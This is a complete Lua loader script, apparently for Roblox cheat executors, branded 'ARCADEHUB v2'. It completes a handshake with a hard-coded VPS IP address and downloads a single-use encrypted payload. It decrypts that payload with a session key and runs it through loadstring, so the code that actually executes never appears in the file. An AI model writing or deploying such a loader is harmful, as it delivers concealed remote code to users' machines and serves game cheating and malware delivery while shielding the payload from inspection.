-- ====================================================================
-- ARCADEHUB v2 COMPACT BOOTSTRAP LOADER (28 BARIS)
-- ====================================================================
local VPS_HOST = "http://103.176.79.8:3000" -- Ganti dengan IP VPS kamu
local HttpService, req = game:GetService("HttpService"), (syn and syn.request) or (http and http.request) or request or http_request

local function hexToBytes(h)
    local b = {}
    for i = 1, #h, 2 do table.insert(b, string.char(tonumber(h:sub(i, i + 1), 16))) end
    return table.concat(b)
end

-- 1. Perform Ephemeral Bootstrap Handshake
local res = req({
    Url = VPS_HOST .. "/api/v2/bootstrap",
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = HttpService:JSONEncode({ placeId = tostring(game.PlaceId), timestamp = os.time() * 1000, nonce = tostring(math.random(100000, 999999)) })
})

if not res or not (res.StatusCode == 200 or res.Status == 200) then return warn("[Loader] Handshake failed!") end
local data = HttpService:JSONDecode(res.Body or res.body)

-- 2. Extract Ephemeral Key & Fetch Single-Use Encrypted Payload
local keyPkg = hexToBytes(data.keyPackage)
local sessionKey, sessionIv = keyPkg:sub(1, 32), keyPkg:sub(33, 48)
local encryptedPayload = game:HttpGet(VPS_HOST .. "/api/v2/payload/" .. data.token)

-- 3. Decrypt & Dynamic Execute via loadstring
local decrypted = (crypt and crypt.decrypt and crypt.decrypt("aes-cbc", encryptedPayload, sessionKey, sessionIv)) or encryptedPayload
local func, err = loadstring(decrypted)
if func then func() else warn("[Loader Error] " .. tostring(err)) end
